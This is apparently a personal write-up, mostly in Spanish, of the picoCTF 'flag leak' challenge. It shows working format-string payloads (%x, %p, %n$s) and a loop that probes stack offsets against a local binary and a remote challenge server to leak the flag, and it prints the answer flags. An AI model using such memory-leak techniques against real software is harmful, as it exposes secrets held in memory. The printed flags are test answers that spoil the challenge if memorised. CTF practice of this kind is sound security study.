# flag leak

Story telling class 1/2 I'm just copying and pasting with this program. What can go wrong? You can view source here. And connect with it using: nc saturn.picoctf.net 49918

## Solucion
- viendo el codigo detectamos que es una vulnerabilidad de "Format String"
- google: format strng vuln> https://owasp.org/www-community/attacks/Format_string_attack

### leakin way 1

```bash

──(kali㉿kali)-[~/picoctf/pwning/flagleak]
└─$ echo '%x_%x_%x_%x' | ./vuln
Tell me a story and then I'll tell you one >> Here's a story - 
ffff3480_f7d73a6c_8049346_255f7825

(kali㉿kali)-[~/picoctf/pwning/flagleak]
└─$ echo '%p_%p_%p_%p' | ./vuln
Tell me a story and then I'll tell you one >> Here's a story - 
0xfff88fc0_0xf7d6fa6c_0x8049346_0x255f7025

```

### leaking way 2
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/flagleak]
└─$ echo '%10$p' | ./vuln
Tell me a story and then I'll tell you one >> Here's a story - 
0xf7f8d720
                                                                                    
┌──(kali㉿kali)-[~/picoctf/pwning/flagleak]
└─$ echo '%20$p' | ./vuln
Tell me a story and then I'll tell you one >> Here's a story - 
0x804c034

┌──(kali㉿kali)-[~/picoctf/pwning/flagleak]
└─$ echo '%10$s' | ./vuln
Tell me a story and then I'll tell you one >> Here's a story - 
UWVS�Vr
                                                                                    
┌──(kali㉿kali)-[~/picoctf/pwning/flagleak]
└─$ echo '%20$s' | ./vuln
Tell me a story and then I'll tell you one >> Here's a story - 
�N��
                                                                                    
┌──(kali㉿kali)-[~/picoctf/pwning/flagleak]
└─$ 

```

### ciclo para sacarlo
- local
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/flagleak]
└─$ for i in {0..999}; do echo "%$i\$s" | ./vuln | grep -Ei "bandera" ; done
{banderafalsa}

```

- remoto
```bash
for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 49484 | grep -Ei "pico|ctf" ; done
CTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_
```




picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}


### Forma 4

```
➜  flagleak python3 -c 'print("%x"*60)' | ./vuln
Tell me a story and then I'll tell you one >> Here's a story -
408003600804934678257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782530080483386f6369707b4654436162616c7265646e657365617d617473804000a40834b604080044840812ad040a728a05869c8000804c000804943080494100804c000408004488049418ffffffff4085996c40846000040800460
➜  flagleak python3 -c 'print("%x"*60)' | nc saturn.picoctf.net 62121
Tell me a story and then I'll tell you one >> Here's a story -
ffc34010ffc340308049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825f2c41d00f2ac6ab06f6369707b4654436b34334c5f676e3167346c466666305f3474535f395f6b63326539397d343238fbad2000516e1b000f2c7d990804c00080494100804c000ffc340f880494182ffc341a4ffc341b00ffc34110
```
- voy al cherry tree y le paso los hex, cambio el endianes y form ex sale la flag

```
picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
```